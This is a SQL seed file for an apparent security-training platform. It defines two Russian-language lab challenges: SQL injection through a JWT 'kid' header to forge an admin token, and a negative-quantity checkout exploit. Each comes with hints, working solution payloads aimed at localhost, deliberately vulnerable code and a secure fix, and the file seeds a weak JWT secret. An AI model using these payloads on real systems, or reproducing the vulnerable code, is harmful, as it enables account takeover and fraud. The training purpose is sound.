CREATE TABLE IF NOT EXISTS auth.jwt_keys (
    kid VARCHAR(64) PRIMARY KEY,
    key_value TEXT NOT NULL,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

INSERT INTO auth.jwt_keys (kid, key_value) VALUES ('default', 'weak-jwt-secret')
ON CONFLICT (kid) DO NOTHING;

INSERT INTO academy.challenges
    (slug, title, service, category, difficulty, description, flag, hint_1, hint_2,
     solution_payload, vulnerable_code, secure_code, order_index)
VALUES
(
    'jwt-kid-injection',
    'JWT: подмена kid',
    'auth-service',
    'JWT',
    'hard',
    $mv$Сервис выбирает ключ проверки токена по заголовку kid. Значение подставляется в SQL-запрос конкатенацией. Верните свой ключ через инъекцию и выпустите административный токен.$mv$,
    'MV{UNSET}',
    $mv$Заголовок JWT может содержать kid — идентификатор ключа. Если сервис ищет ключ в базе по этому значению, посмотрите, как именно строится запрос.$mv$,
    $mv$Значение kid попадает в строку SQL без параметров. Завершите условие и добавьте UNION SELECT со своим ключом, затем подпишите HS256-токен с ролью admin.$mv$,
    $mv$# kid в заголовке, подпись HS256 секретом pwned-secret
python - <<'PY'
import jwt
token = jwt.encode(
    {"sub": "<student-id>", "username": "student", "role": "admin"},
    "pwned-secret",
    algorithm="HS256",
    headers={"kid": "nope' UNION SELECT 'pwned-secret' -- "},
)
print(token)
PY

curl http://localhost:4000/api/auth/me \
  -H "Authorization: Bearer <token>"$mv$,
    $mv$kid = header.get("kid")
row = await fetchrow(
    "SELECT key_value FROM auth.jwt_keys "
    f"WHERE kid = '{kid}'"
)
payload = jwt.decode(token, row["key_value"], algorithms=["HS256"])
$mv$,
    $mv$ALLOWED_KIDS = {"default"}

kid = header.get("kid")
if kid not in ALLOWED_KIDS:
    raise jwt.InvalidTokenError("unknown key id")
row = await fetchrow(
    "SELECT key_value FROM auth.jwt_keys WHERE kid = $1",
    kid,
)
payload = jwt.decode(token, row["key_value"], algorithms=["HS256"])
$mv$,
    31
),
(
    'inventory-negative-quantity',
    'Бизнес-логика: отрицательное количество',
    'inventory-service',
    'Business Logic',
    'medium',
    $mv$Эндпоинт оформления корзины умножает цену товара на количество и списывает сумму с баланса. Знак и границы количества не проверяются. Увеличьте баланс отрицательным количеством.$mv$,
    'MV{UNSET}',
    $mv$Бизнес-логика ломается, когда число из запроса не проверяют на диапазон. Что произойдёт с балансом, если количество меньше нуля?$mv$,
    $mv$POST /api/inventory/cart/checkout принимает productId и quantity. Отправьте quantity: -5 и посмотрите на поле balance в ответе.$mv$,
    $mv$curl -X POST http://localhost:4000/api/inventory/cart/checkout \
  -H "Authorization: Bearer <student-token>" \
  -H "Content-Type: application/json" \
  -d '{"productId": 1, "quantity": -5}'$mv$,
    $mv$total := price * int64(body.Quantity)
if total <= balance {
    createOrder(user, total)
    balance -= total
}
$mv$,
    $mv$if body.Quantity <= 0 {
    writeJSON(w, http.StatusBadRequest,
        map[string]string{"error": "quantity must be positive"})
    return
}
total := price * int64(body.Quantity)
if total <= 0 || total > balance {
    writeJSON(w, http.StatusPaymentRequired,
        map[string]string{"error": "insufficient funds"})
    return
}$mv$,
    32
)
ON CONFLICT (slug) DO NOTHING;
